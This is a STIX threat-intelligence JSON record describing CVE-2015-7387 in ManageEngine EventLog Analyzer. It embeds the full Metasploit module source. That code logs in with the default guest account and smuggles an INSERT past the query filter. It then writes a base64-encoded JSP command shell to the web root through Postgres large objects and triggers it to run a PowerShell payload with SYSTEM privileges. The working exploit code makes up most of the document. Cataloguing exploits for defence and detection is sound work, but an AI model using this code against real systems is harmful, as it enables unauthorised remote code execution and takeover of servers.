{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9872c333-cc77-4167-8ae5-f58e585d8f3f",
    "created": "2024-08-14T16:47:13.515582Z",
    "modified": "2024-08-14T16:47:13.515586Z",
    "name": "ManageEngine EventLog Analyzer Remote Code Execution",
    "description": " This module exploits a SQL query functionality in ManageEngine EventLog Analyzer v10.6 build 10060 and previous versions. Every authenticated user, including the default \"guest\" account can execute SQL queries directly on the underlying Postgres database server. The queries are executed as the \"postgres\" user which has full privileges and thus is able to write files to disk. This way a JSP payload can be uploaded and executed with SYSTEM privileges on the web server. This module has been tested successfully on ManageEngine EventLog Analyzer 10.0 (build 10003) over Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/manageengine_eventlog_analyzer_rce.rb",
            "external_id": "manageengine_eventlog_analyzer_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-7387"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Sep/59"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Powershell\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'ManageEngine EventLog Analyzer Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a SQL query functionality in ManageEngine EventLog Analyzer v10.6\n        build 10060 and previous versions. Every authenticated user, including the default \"guest\"\n        account can execute SQL queries directly on the underlying Postgres database server. The\n        queries are executed as the \"postgres\" user which has full privileges and thus is able to\n        write files to disk. This way a JSP payload can be uploaded and executed with SYSTEM\n        privileges on the web server. This module has been tested successfully on ManageEngine\n        EventLog Analyzer 10.0 (build 10003) over Windows 7 SP1.\n       },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'xistence <xistence[at]0x90.nl>' # Discovery, Metasploit module\n        ],\n      'References'     =>\n        [\n          ['EDB', '38173'],\n          ['CVE', '2015-7387'],\n          ['URL', 'https://seclists.org/fulldisclosure/2015/Sep/59']\n        ],\n      'Platform'       => ['win'],\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          ['ManageEngine EventLog Analyzer 10.0 (build 10003) / Windows 7 SP1', {}]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2015-07-11',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(8400),\n          OptString.new('USERNAME', [ true, 'The username to authenticate as', 'guest' ]),\n          OptString.new('PASSWORD', [ true, 'The password to authenticate as', 'guest' ])\n        ])\n end\n\n  def uri\n    target_uri.path\n  end\n\n\n  def check\n    # Check version\n    vprint_status(\"Trying to detect ManageEngine EventLog Analyzer\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'event', 'index3.do')\n    })\n\n    if res && res.code == 200 && res.body && res.body.include?('ManageEngine EventLog Analyzer')\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def sql_query(cookies, query)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, 'event', 'runQuery.do'),\n      'cookie' => cookies,\n      'vars_post' => {\n        'execute' => 'true',\n        'query' => query,\n      }\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Failed executing SQL query!\")\n    end\n\n    res\n  end\n\n\n  def generate_jsp_payload(cmd)\n\n    decoder = rand_text_alpha(4 + rand(32 - 4))\n    decoded_bytes = rand_text_alpha(4 + rand(32 - 4))\n    cmd_array = rand_text_alpha(4 + rand(32 - 4))\n    jsp_code = '<%'\n    jsp_code <<  \"sun.misc.BASE64Decoder #{decoder} = new sun.misc.BASE64Decoder();\\n\"\n    jsp_code << \"byte[] #{decoded_bytes} = #{decoder}.decodeBuffer(\\\"#{Rex::Text.encode_base64(cmd)}\\\");\\n\"\n    jsp_code << \"String [] #{cmd_array} = new String[3];\\n\"\n    jsp_code << \"#{cmd_array}[0] = \\\"cmd.exe\\\";\\n\"\n    jsp_code << \"#{cmd_array}[1] = \\\"/c\\\";\\n\"\n    jsp_code << \"#{cmd_array}[2] = new String(#{decoded_bytes}, \\\"UTF-8\\\");\\n\"\n    jsp_code << \"Runtime.getRuntime().exec(#{cmd_array});\\n\"\n    jsp_code << '%>'\n\n    jsp_code\n  end\n\n\n  def exploit\n\n    print_status(\"Retrieving JSESSION ID\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'event', 'index3.do'),\n    })\n\n    if res && res.code == 200 && res.get_cookies =~ /JSESSIONID=(\\w+);/\n      jsessionid = $1\n      print_status(\"JSESSION ID Retrieved [ #{jsessionid} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Unable to retrieve JSESSION ID!\")\n    end\n\n    print_status(\"Access login page\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, 'event', \"j_security_check;jsessionid=#{jsessionid}\"),\n      'vars_post' => {\n        'forChecking' => 'null',\n        'j_username' => datastore['USERNAME'],\n        'j_password' => datastore['PASSWORD'],\n        'domains' => \"Local Authentication\\r\\n\",\n        'loginButton' => 'Login',\n        'optionValue' => 'hide'\n      }\n    })\n\n    if res && res.code == 302\n      redirect =  URI(res.headers['Location'])\n      print_status(\"Location is [ #{redirect} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Access to login page failed!\")\n    end\n\n\n    # Follow redirection process\n    print_status(\"Following redirection\")\n    res = send_request_cgi({\n      'uri' => \"#{redirect}\",\n      'method' => 'GET'\n    })\n\n    if res && res.code == 200 && res.get_cookies =~ /JSESSIONID/\n      cookies = res.get_cookies\n      print_status(\"Logged in, new cookies retrieved [#{cookies}]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Redirect failed, unable to login with provided credentials!\")\n    end\n\n\n    jsp_name = rand_text_alphanumeric(4 + rand(32 - 4)) + '.jsp'\n\n    cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first)\n    jsp_payload = Rex::Text.encode_base64(generate_jsp_payload(cmd)).gsub(/\\n/, '')\n\n\n    print_status(\"Executing SQL queries\")\n\n    # Remove large object in database, just in case it exists from previous exploit attempts\n    sql = 'SELECT lo_unlink(-1)'\n    result = sql_query(cookies, sql)\n\n    # Create large object \"-1\". We use \"-1\" so we will not accidently overwrite large objects in use by other tasks.\n    sql = 'SELECT lo_create(-1)'\n    result = sql_query(cookies, sql)\n    if result.body =~ /menuItemRow\\\">([0-9]+)/\n      loid = $1\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Postgres Large Object ID not found!\")\n    end\n\n    select_random = rand_text_numeric(2 + rand(6 - 2))\n    # Insert JSP payload into the pg_largeobject table. We have to use \"SELECT\" first to to bypass OpManager's checks for queries starting with INSERT/UPDATE/DELETE, etc.\n    sql = \"SELECT #{select_random};INSERT INTO/**/pg_largeobject/**/(loid,pageno,data)/**/VALUES(#{loid}, 0, DECODE('#{jsp_payload}', 'base64'));--\"\n\n\n    result = sql_query(cookies, sql)\n\n    # Export our large object id data into a WAR file\n    sql = \"SELECT lo_export(#{loid}, '..//..//webapps//event/#{jsp_name}');\"\n\n    sql_query(cookies, sql)\n\n    # Remove our large object in the database\n    sql = 'SELECT lo_unlink(-1)'\n    result = sql_query(cookies, sql)\n\n    register_file_for_cleanup(\"..\\\\webapps\\\\event\\\\#{jsp_name}\")\n\n    print_status(\"Executing JSP payload\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, jsp_name),\n    })\n\n    # If the server returns 200 we assume we uploaded and executed the payload file successfully\n    unless res && res.code == 200\n      print_status(\"#{res.code}\\n#{res.body}\")\n      fail_with(Failure::Unknown, \"#{peer} - Payload not executed, aborting!\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-11",
    "x_mitre_platforms": [
        "['win']"
    ]
}